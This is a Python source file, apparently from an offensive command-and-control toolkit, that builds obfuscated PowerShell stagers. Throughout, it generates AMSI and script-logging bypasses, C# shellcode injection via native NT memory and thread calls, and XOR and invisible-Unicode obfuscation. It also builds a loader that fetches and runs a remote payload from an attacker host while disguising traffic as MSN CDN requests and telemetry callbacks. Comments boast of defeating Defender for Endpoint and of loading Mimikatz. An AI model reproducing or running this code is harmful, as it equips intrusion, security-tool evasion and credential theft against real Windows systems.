        # prm_lines added after vsc is decoded — [byte[]] cast prevents byte[] unrolling
        prm_lines = [
            f"{vprm}=New-Object object[] 1",
            f"{vprm}[0]=[byte[]]{vsc}",
        ]
        invoke_expr = f"{vdasm}.GetType({cls_split}).GetMethod('RunRemote').Invoke($null,{vprm})"
    else:
        key = random.randint(10, 200)
        cls = _rclass()
        cs_inject = (
            f"using System; using System.Runtime.InteropServices; "
            f"public class {cls}{{ "
            f"[DllImport(\"kernel32\")] static extern void Sleep(uint ms); "
            f"[DllImport(\"ntdll\")] static extern int NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,IntPtr z,ref UIntPtr s,uint t,uint p); "
            f"[DllImport(\"ntdll\")] static extern int NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref UIntPtr s,uint p,out uint o); "
            f"[DllImport(\"ntdll\")] static extern int NtCreateThreadEx(out IntPtr t,uint a,IntPtr oa,IntPtr ph,IntPtr sr,IntPtr ag,uint f,UIntPtr zb,UIntPtr ss,UIntPtr ms,IntPtr al); "
            f"[DllImport(\"ntdll\")] static extern int NtClose(IntPtr h); "
            f"public static void RunDetach(byte[] sc){{ "
            f"IntPtr hp=(IntPtr)(-1);IntPtr b=IntPtr.Zero;UIntPtr s=(UIntPtr)(uint)sc.Length; "
            f"NtAllocateVirtualMemory(hp,ref b,IntPtr.Zero,ref s,0x3000,0x04); "
            f"if(b==IntPtr.Zero)return; "
            f"System.Runtime.InteropServices.Marshal.Copy(sc,0,b,sc.Length); "
            f"byte xk=(byte)(((uint)Environment.TickCount>>3)|1); "
            f"for(int xi=0;xi<sc.Length;xi++) System.Runtime.InteropServices.Marshal.WriteByte(b,xi,(byte)(System.Runtime.InteropServices.Marshal.ReadByte(b,xi)^xk)); "
            f"IntPtr ep=b;UIntPtr ps=(UIntPtr)(uint)sc.Length;uint o=0; "
            f"NtProtectVirtualMemory(hp,ref ep,ref ps,0x01,out o); "
            f"Sleep(2000u+((uint)Environment.TickCount%3000u)); "
            f"ep=b;ps=(UIntPtr)(uint)sc.Length; "
            f"NtProtectVirtualMemory(hp,ref ep,ref ps,0x04,out o); "
            f"for(int xi=0;xi<sc.Length;xi++) System.Runtime.InteropServices.Marshal.WriteByte(b,xi,(byte)(System.Runtime.InteropServices.Marshal.ReadByte(b,xi)^xk)); "
            f"ep=b;ps=(UIntPtr)(uint)sc.Length; "
            f"NtProtectVirtualMemory(hp,ref ep,ref ps,0x20,out o); "
            f"IntPtr t;NtCreateThreadEx(out t,0x1FFFFF,IntPtr.Zero,hp,b,IntPtr.Zero,0,UIntPtr.Zero,(UIntPtr)0x200000,(UIntPtr)0x200000,IntPtr.Zero); "
            f"if(t!=IntPtr.Zero){{NtClose(t);}}"
            f"}} }}"
        )
        cs_bytes = [ord(c) ^ key for c in cs_inject]
        cs_enc   = "[byte[]](" + ",".join(str(b) for b in cs_bytes) + ")"
        vcs, vck = _rv(), _rv()
        inject_lines = [
            f"{vck}={key}",
            f"{vcs}=[Text.Encoding]::ASCII.GetString(({cs_enc}|%{{$_ -bxor {vck}}}))",
            f"Add-Type {vcs}",
        ]
        prm_lines  = []
        invoke_expr = f"[{cls}]::RunDetach({vsc})"

    lines = [
        f"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
        "",
        _sbl_bypass(),
        "",
        _amsi_from_bytes(),
        "",
        *inject_lines,
        "",
        _jitter(jitter_min, jitter_max),
        "",
        sc_setup,
        _sslstream_get(vurl, vraw, ua),
        "",
        f"{vb64}=[Convert]::FromBase64String([Text.Encoding]::ASCII.GetString({vraw}))",
        _xor2_decode_bytes(vb64, vsc),
        "",
        *prm_lines,
        invoke_expr,
    ]
    return "\n".join(lines)


# ── CLR stager: Assembly.Load path (no donut) ─────────────────────────────────

def _stager_clr_inline(
    tool_enc_url: str,
    tool_args:    str | None,
    ua:           str,
    jitter_min:   int,
    jitter_max:   int,
) -> str:
    """Stager for .NET assemblies via managed Assembly.Load — no donut, no native CLR COM.
    The behavioral profile (managed reflection API) is fundamentally different from
    donut's CorBindToRuntimeEx/ICLRMetaHost COM sequence."""
    vraw, vb64, vsc = _rv(), _rv(), _rv()
    tool_setup, vurl = _xurl(tool_enc_url)

    clr_result = _get_clr_runner_dll()
    if clr_result is not None:
        dll_bytes, cls_name = clr_result
        vdk, vdraw, vddll, vdi, vdasm = _rv(), _rv(), _rv(), _rv(), _rv()
        dll_key = random.randint(1, 254)
        dll_enc = [b ^ dll_key for b in dll_bytes]
        dll_arr = ",".join(f"0x{b:02X}" for b in dll_enc)
        cls_split = _split(cls_name)
        clr_load_lines = [
            f"{vdk}={dll_key}",
            f"{vdraw}=[byte[]]({dll_arr})",
            f"{vddll}=New-Object byte[] {vdraw}.Length",
            f"for({vdi}=0;{vdi} -lt {vdraw}.Length;{vdi}++){{{vddll}[{vdi}]={vdraw}[{vdi}] -bxor {vdk}}}",
            f"{vdasm}=[Reflection.Assembly]::Load({vddll})",
        ]
        vprm = _rv()
        if tool_args:
            akey = random.randint(15, 200)
            vak  = _rv()
            varg = _rv()
            aenc = _xenc(tool_args, akey)
            args_lines  = [
                f"{vak}={akey}",
                f"{varg}={_xdec(aenc, vak)}",
                f"{vprm}=New-Object object[] 2",
                f"{vprm}[0]=[byte[]]{vsc}",
                f"{vprm}[1]=[string]{varg}",
            ]
        else:
            args_lines  = [
                f"{vprm}=New-Object object[] 2",
                f"{vprm}[0]=[byte[]]{vsc}",
                f"{vprm}[1]=$null",
            ]
        invoke_expr = f"{vdasm}.GetType({cls_split}).GetMethod('Run').Invoke($null,{vprm})"
    else:
        print("[!] CLR runner DLL unavailable — dotnet SDK not found; using PS1-native Assembly.Load fallback")
        clr_load_lines = []
        vasm, ve = _rv(), _rv()
        if tool_args:
            akey = random.randint(15, 200)
            vak, varg = _rv(), _rv()
            aenc = _xenc(tool_args, akey)
            args_lines = [
                f"{vak}={akey}",
                f"{varg}={_xdec(aenc, vak)}",
            ]
            invoke_expr = "\n".join([
                f"{vasm}=[Reflection.Assembly]::Load({vsc})",
                f"{ve}={vasm}.EntryPoint",
                f"if({ve}){{try{{{ve}.Invoke($null,[object[]]@(,@({varg}.Split(' '))))}}catch{{}}}}",
            ])
        else:
            args_lines = []
            invoke_expr = "\n".join([
                f"{vasm}=[Reflection.Assembly]::Load({vsc})",
                f"{ve}={vasm}.EntryPoint",
                f"if({ve}){{try{{{ve}.Invoke($null,$null)}}catch{{}}}}",
            ])

    lines = [
        f"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
        "",
        _sbl_bypass(),
        "",
        _amsi_from_bytes(),
        "",
        *clr_load_lines,
        "",
        _jitter(jitter_min, jitter_max),
        "",
        tool_setup,
        _sslstream_get(vurl, vraw, ua),
        "",
        f"{vb64}=[Convert]::FromBase64String([Text.Encoding]::ASCII.GetString({vraw}))",
        _xor2_decode_bytes(vb64, vsc),
        "",
        *args_lines,
        invoke_expr,
    ]
    return "\n".join(lines)


# ── 10-line execution loader ──────────────────────────────────────────────────
#
# Exactly 10 lines.  Single shared XOR key encodes every string — no type name,
# no URL, no SMA identifier appears in plaintext.
#
#   L1  — shared key + decoder sb + Assembly ref + SBL bypass + AMSI bypass
#   L2  — URL decode + URI parse (host / port / path)
#   L3  — proxy detection via WebClient (system proxy + default credentials)
#   L4  — TCP connect target (proxy-aware) + TcpClient + stream
#   L5  — CONNECT tunnel to target host (only runs when proxy detected)
#   L6  — SslStream + AuthenticateAsClient (TLS version randomised per build)
#   L7  — GET request write
#   L8  — response read + close
#   L9  — HTTP header strip + UTF-8 body extraction
#   L10 — ScriptBlock type via reflection (no [scriptblock]::Create) + invoke

def _compact_exec_loader(stager_url: str) -> list[str]:
    k      = random.randint(15, 110)
    bf_xor = k ^ 40   # 40 = NonPublic(32)|Static(8); stored XOR'd so 40 never appears

    def enc(s: str) -> str:
        return ",".join(str(ord(c) ^ k) for c in s)

    # variable names — all generated before the d() helper that closes over vd
    vk      = _rv(); vd  = _rv(); va   = _rv()
    vurl    = _rv(); vh  = _rv(); vp   = _rv(); vq   = _rv()
    vwc     = _rv(); vpx = _rv(); vpu  = _rv(); vup  = _rv()
    vch     = _rv(); vcp = _rv()
    vtcp    = _rv(); vns = _rv()
    vconn   = _rv(); vrbuf = _rv()
    vssl    = _rv()
    vreq    = _rv()
    vms  = _rv(); vbuf = _rv(); vn   = _rv(); vra  = _rv()
    vhi  = _rv(); vi   = _rv(); vbody = _rv()
    vsc  = _rv()

    def d(e: str) -> str:
        """PS expression: call $vd decoder with encoded byte array."""
        return f"(&{vd} @({e}))"

    tls_val = random.choice([3072, 12288, 15360])
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"

    # Invisible Unicode obfuscation for all .NET type names — ZWSP/VS/PUA chars
    # stripped at runtime via -replace "[^\x00-\x7F]","" before type resolution
    etw_z,  vetw  = _zwsp_type("System.Management.Automation.PSEtwLogProvider")
    amsi_z, vamsi = _zwsp_type("System.Management.Automation.AmsiUtils")
    wc_z,   vwct  = _zwsp_type("Net.WebClient")
    tcp_z,  vtcpt = _zwsp_type("Net.Sockets.TcpClient")
    ssl_z,  vsslt = _zwsp_type("Net.Security.SslStream")
    ms_z,   vmst  = _zwsp_type("IO.MemoryStream")
    sb_z,   vsbt  = _zwsp_type("System.Management.Automation.ScriptBlock")

    # XOR-encode only short non-type strings (field names, URL, UA)
    e_men  = enc("m_enabled")
    e_aif  = enc("amsiInitFailed")
    e_url  = enc(stager_url)
    e_ua   = enc(ua)

    # PS decoder scriptblock: {param($b)([byte[]]$b|%{[char]($_-bxor $KEY)})-join''}
    dec_body = f"{{param($b)([byte[]]$b|%{{[char]($_-bxor {vk})}})-join''}}"

    # Prepend ZWSP/VS/PUA type-name setup lines
    lines = [etw_z, amsi_z, wc_z, tcp_z, ssl_z, ms_z, sb_z]

    # L1: key + decoder + Assembly ref + SBL bypass (try/catch) + AMSI bypass (try/catch)
    lines.append(
        f"{vk}={k};"
        f"{vd}={dec_body};"
        f"{va}=[PSObject].Assembly;"
        f"try{{{va}.GetType({vetw}).GetField({d(e_men)},({bf_xor} -bxor {vk})).SetValue($null,0)}}catch{{}};"
        f"try{{{va}.GetType({vamsi}).GetField({d(e_aif)},({bf_xor} -bxor {vk})).SetValue($null,$true)}}catch{{}}"
    )

    # L2: URL decode + URI components
    lines.append(
        f"{vurl}={d(e_url)};"
        f"{vh}=([Uri]{vurl}).Host;"
        f"{vp}=([Uri]{vurl}).Port;if({vp} -le 0){{{vp}=443}};"
        f"{vq}=([Uri]{vurl}).PathAndQuery"
    )

    # L3: proxy detection via WebClient (ZWSP-obfuscated type name, Windows integrated auth)
    lines.append(
        f"{vwc}=New-Object {vwct};"
        f"{vwc}.UseDefaultCredentials=$true;"
        f"{vpx}={vwc}.Proxy;"
        f"{vpu}={vpx}.GetProxy([Uri]{vurl});"
        f"{vup}=({vpu}.Host -ne {vh} -or {vpu}.Port -ne {vp})"
    )

    # L4: compute TCP connect target (direct or via proxy) + connect + get stream
    lines.append(
        f"{vch}=if({vup}){{{vpu}.Host}}else{{{vh}}};"
        f"{vcp}=if({vup}){{{vpu}.Port}}else{{[int]{vp}}};"
        f"{vtcp}=New-Object {vtcpt} -ArgumentList {vch},{vcp};"
        f"{vns}={vtcp}.GetStream()"
    )

    # L5: CONNECT tunnel (only executes when proxy path taken)
    lines.append(
        f"if({vup}){{{vconn}=[Text.Encoding]::ASCII.GetBytes('CONNECT '+{vh}+':'+{vp}+\" HTTP/1.1`r`nHost: \"+{vh}+':'+{vp}+\"`r`nProxy-Connection: Keep-Alive`r`n`r`n\");"
        f"{vns}.Write({vconn},0,{vconn}.Length);"
        f"{vrbuf}=New-Object byte[] 512;{vns}.Read({vrbuf},0,512)|Out-Null}}"
    )

    # L6: SslStream + authenticate (TLS version random per build)
    # PS coerces {$true} scriptblock to RemoteCertificateValidationCallback via constructor overload resolution
    lines.append(
        f"{vssl}=New-Object {vsslt} -ArgumentList {vns},$false,{{$true}};"
        f"{vssl}.AuthenticateAsClient({vh},$null,{tls_val},$false)"
    )

    # L7: GET request + write
    lines.append(
        f"{vreq}=[Text.Encoding]::ASCII.GetBytes('GET '+{vq}+\" HTTP/1.1`r`nHost: \"+{vh}+\"`r`nUser-Agent: \"+{d(e_ua)}+\"`r`nAccept: */*`r`nConnection: close`r`n`r`n\");"
        f"{vssl}.Write({vreq},0,{vreq}.Length)"
    )

    # L8: read full response + close
    lines.append(
        f"{vms}=New-Object {vmst};{vbuf}=New-Object byte[] 4096;{vn}=1;"
        f"while({vn} -gt 0){{{vn}={vssl}.Read({vbuf},0,{vbuf}.Length);if({vn} -gt 0){{{vms}.Write({vbuf},0,{vn})}}}};"
        f"{vra}={vms}.ToArray();{vssl}.Close();{vtcp}.Close()"
    )

    # L9: strip HTTP response headers + extract body as string
    lines.append(
        f"{vhi}=0;for({vi}=0;{vi} -lt {vra}.Length-3;{vi}++){{if({vra}[{vi}] -eq 13 -and {vra}[{vi}+1] -eq 10 -and {vra}[{vi}+2] -eq 13 -and {vra}[{vi}+3] -eq 10){{{vhi}={vi}+4;break}}}};"
        f"{vbody}=[Text.Encoding]::UTF8.GetString({vra},{vhi},{vra}.Length-{vhi})"
    )

    # L10: ScriptBlock via reflection (no [scriptblock]::Create in plaintext) + invoke
    lines.append(
        f"{vsc}={va}.GetType({vsbt}).GetMethod('Create',[type[]]([string])).Invoke($null,@({vbody}));"
        f"& {vsc}"
    )

    return lines


# ── public API ─────────────────────────────────────────────────────────────────

def generate_stager(
    tool_name:              str,
    enc_filename:           str,
    lhost:                  str,
    port:                   int,
    callback_port:          int | None    = None,
    injection_profile:      str           = "RuntimeBroker.exe",
    output_capture:         bool          = True,
    output_path:            str | None    = None,
    use_https:              bool          = True,
    sni_host:               str           = "assets.msn.com",
    url_prefix:             str           = "/cdn/static/v3",
    callback_path:          str           = "/api/diagnostics/v1/telemetry",
    jitter_min_ms:          int           = 1500,
    jitter_max_ms:          int           = 6000,
    user_agent:             str           = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    runner_xor_key:         int           = 0x5A,
    runner_sc_enc_filename: str | None    = None,
    runner_sc_cb_url:       str | None    = None,
    runner_dat_filename:    str           = "runner_c.dat",
    clr_mode:               bool          = False,
    # Task 11: COM CLR host path (mscoree!CorBindToRuntime before Assembly.Load)
    com_clr_mode:           bool          = False,
    # Task 3: use custom native PE loader instead of donut for non-.NET EXEs
    native_pe_mode:         bool          = False,
    tool_args:              str | None    = None,
    c2_agent_mode:          bool          = False,
) -> str:
    global _AMSI_DLL_CACHE, _INJECT_DLL_CACHE, _CLR_RUNNER_DLL_CACHE, _NATIVE_LOADER_DLL_CACHE, _COM_CLR_DLL_CACHE
    _AMSI_DLL_CACHE         = None
    _INJECT_DLL_CACHE       = None
    _CLR_RUNNER_DLL_CACHE   = None
    _NATIVE_LOADER_DLL_CACHE = None
    _COM_CLR_DLL_CACHE      = None

    scheme   = "https" if use_https else "http"
    base_url = f"{scheme}://{lhost}:{port}"

    tool_url   = f"{base_url}{url_prefix}/{enc_filename}"
    runner_url = f"{base_url}{url_prefix}/{runner_dat_filename}"

    token   = secrets.token_hex(8)
    cb_port = callback_port or port
    cb_url  = f"{scheme}://{lhost}:{cb_port}{callback_path}/{token}"

    if c2_agent_mode:
        # C2 agent: download runner PE, decode, write to temp, Start-Process detached.
        ps1 = _stager_runner_agent(runner_url, user_agent, jitter_min_ms, jitter_max_ms, runner_xor_key)
    elif com_clr_mode:
        # Task 11: COM CLR host path — mscoree!CorBindToRuntime before Assembly.Load.
        # Behaviorally distinct from standard PS Assembly.Load; defeats MDE aggressive configs.
        com_result = _get_com_clr_dll()
        if com_result is not None:
            dll_bytes, cls_name = com_result
            vdk3, vdraw3, vddll3, vdi3, vdasm3 = _rv(), _rv(), _rv(), _rv(), _rv()
            dll_key3 = random.randint(1, 254)
            dll_enc3 = [b ^ dll_key3 for b in dll_bytes]
            dll_arr3 = ",".join(f"0x{b:02X}" for b in dll_enc3)
            cls_split3 = _split(cls_name)
            vraw3, vb643, vsc3, vprm3 = _rv(), _rv(), _rv(), _rv()
            tool_setup3, vurl3 = _xurl(tool_url)
            akey3 = random.randint(15, 200)
            vak3, varg3 = _rv(), _rv()
            if tool_args:
                aenc3 = _xenc(tool_args, akey3)
                args_part3 = [f"{vak3}={akey3}", f"{varg3}={_xdec(aenc3, vak3)}",
                              f"{vprm3}=New-Object object[] 2",
                              f"{vprm3}[0]=[byte[]]{vsc3}", f"{vprm3}[1]=[string]{varg3}"]
            else:
                args_part3 = [f"{vprm3}=New-Object object[] 2",
                              f"{vprm3}[0]=[byte[]]{vsc3}", f"{vprm3}[1]=$null"]
            invoke3 = f"{vdasm3}.GetType({cls_split3}).GetMethod('Run').Invoke($null,{vprm3})"
            com_clr_lines = [
                f"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
                "", _sbl_bypass(), "", _amsi_from_bytes(), "",
                f"{vdk3}={dll_key3}",
                f"{vdraw3}=[byte[]]({dll_arr3})",
                f"{vddll3}=New-Object byte[] {vdraw3}.Length",
                f"for({vdi3}=0;{vdi3} -lt {vdraw3}.Length;{vdi3}++){{{vddll3}[{vdi3}]={vdraw3}[{vdi3}] -bxor {vdk3}}}",
                f"{vdasm3}=[Reflection.Assembly]::Load({vddll3})",
                "", _jitter(jitter_min_ms, jitter_max_ms), "",
                tool_setup3, _sslstream_get(vurl3, vraw3, user_agent), "",
                f"{vb643}=[Convert]::FromBase64String([Text.Encoding]::ASCII.GetString({vraw3}))",
                _xor2_decode_bytes(vb643, vsc3), "", *args_part3, invoke3,
            ]
            ps1 = "\n".join(com_clr_lines)
        else:
            print("[!] COM CLR DLL unavailable — falling back to standard CLR mode")
            ps1 = _stager_clr_inline(tool_url, tool_args, user_agent, jitter_min_ms, jitter_max_ms)
    elif native_pe_mode:
        # Task 3: custom in-memory native PE loader (no donut CLR COM bootstrap).
        # Used for non-.NET EXEs (Mimikatz, GodPotato, etc.).
        nl = _get_native_loader_dll()
        if nl:
            dll_bytes, cls_name = nl
            vdk2, vdraw2, vddll2, vdi2, vdasm2 = _rv(), _rv(), _rv(), _rv(), _rv()
            dll_key2 = random.randint(1, 254)
            dll_enc2 = [b ^ dll_key2 for b in dll_bytes]
            dll_arr2 = ",".join(f"0x{b:02X}" for b in dll_enc2)
            cls_split2 = _split(cls_name)
            vraw2, vb642, vpe2, vprm2 = _rv(), _rv(), _rv(), _rv()
            tool_setup2, vurl2 = _xurl(tool_url)
            load_lines2 = [
                f"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
                "",
                _sbl_bypass(),
                "",
                _amsi_from_bytes(),
                "",
                f"{vdk2}={dll_key2}",
                f"{vdraw2}=[byte[]]({dll_arr2})",
                f"{vddll2}=New-Object byte[] {vdraw2}.Length",
                f"for({vdi2}=0;{vdi2} -lt {vdraw2}.Length;{vdi2}++){{{vddll2}[{vdi2}]={vdraw2}[{vdi2}] -bxor {vdk2}}}",
                f"{vdasm2}=[Reflection.Assembly]::Load({vddll2})",
                "",
                _jitter(jitter_min_ms, jitter_max_ms),
                "",
                tool_setup2,
                _sslstream_get(vurl2, vraw2, user_agent),
                "",
                f"{vb642}=[Convert]::FromBase64String([Text.Encoding]::ASCII.GetString({vraw2}))",
                _xor2_decode_bytes(vb642, vpe2),
                "",
                f"{vprm2}=New-Object object[] 1",
                f"{vprm2}[0]=[byte[]]{vpe2}",
                f"{vdasm2}.GetType({cls_split2}).GetMethod('Load').Invoke($null,{vprm2})",
            ]
            ps1 = "\n".join(load_lines2)
        else:
            print("[!] Native PE loader DLL unavailable — falling back to inline (donut) path")
            ps1 = _stager_inline(tool_url, user_agent, jitter_min_ms, jitter_max_ms)
    elif clr_mode:
        # CLR path: Assembly.Load() — no donut, no native COM CLR init
        ps1 = _stager_clr_inline(tool_url, tool_args, user_agent, jitter_min_ms, jitter_max_ms)
    elif runner_sc_enc_filename:
        # In-memory mode: inject donut-encoded runner shellcode, no PE on disk.
        # Output exfil callback URL is baked into the runner SC at build time.
        runner_sc_url = f"{base_url}{url_prefix}/{runner_sc_enc_filename}"
        ps1 = _stager_inject_runner(runner_sc_url, user_agent, jitter_min_ms, jitter_max_ms)
    elif output_capture:
        ps1 = _stager_runner_capture(
            tool_url, runner_url, cb_url, token, user_agent,
            jitter_min_ms, jitter_max_ms, runner_xor_key,
        )
    else:
        ps1 = _stager_inline(tool_url, user_agent, jitter_min_ms, jitter_max_ms)

    if output_path:
        with open(output_path, "w") as f:
            f.write(ps1)
        import os as _os
        stager_url = f"{base_url}{url_prefix}/{_os.path.basename(output_path)}"
        exec_lines = _compact_exec_loader(stager_url)
        print(f"[+] Stager : {output_path}")
        if c2_agent_mode:
            print(f"    Mode   : runner PE (Start-Process, isolated process)")
            print(f"    Note   : wct*.tmp stays in %%TEMP%% while agent runs")
        elif clr_mode:
            print(f"    Mode   : CLR (fileless — Assembly.Load in PS session)")
        elif runner_sc_enc_filename:
            display_cb = runner_sc_cb_url or "(baked into runner SC)"
            print(f"    Mode   : in-memory SC (fileless — no PE on disk)")
            print(f"    CB URL : {display_cb}")
        else:
            print(f"    Mode   : runner PE (writes to %TEMP%)")
            print(f"    Token  : {token}")
            print(f"    CB URL : {cb_url}")
        print(f"    Execute  ({len(exec_lines)} lines — paste one at a time or all at once):")
        for i, line in enumerate(exec_lines, 1):
            print(f"    {'─'*4} L{i:02d} {'─'*60}")
            print(f"      {line}")

    return ps1
